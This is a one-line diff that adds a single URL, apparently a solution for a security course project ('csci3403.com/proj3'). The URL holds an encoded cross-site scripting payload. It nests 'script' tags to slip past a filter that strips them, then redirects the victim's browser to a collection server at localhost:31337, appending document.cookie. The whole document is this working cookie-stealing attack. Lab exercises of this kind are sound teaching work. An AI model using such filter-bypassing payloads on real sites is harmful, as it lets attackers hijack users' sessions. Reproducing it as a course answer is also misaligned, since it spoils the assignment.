@@ -1,0 +1,1 @@
+https://csci3403.com/proj3/search?q=%3Cscrscriptipt%3Edocument.location=%22http://localhost:31337/stolen?cookies=%22+%2Bdocument.cookie%3C/scrscriptipt%3E
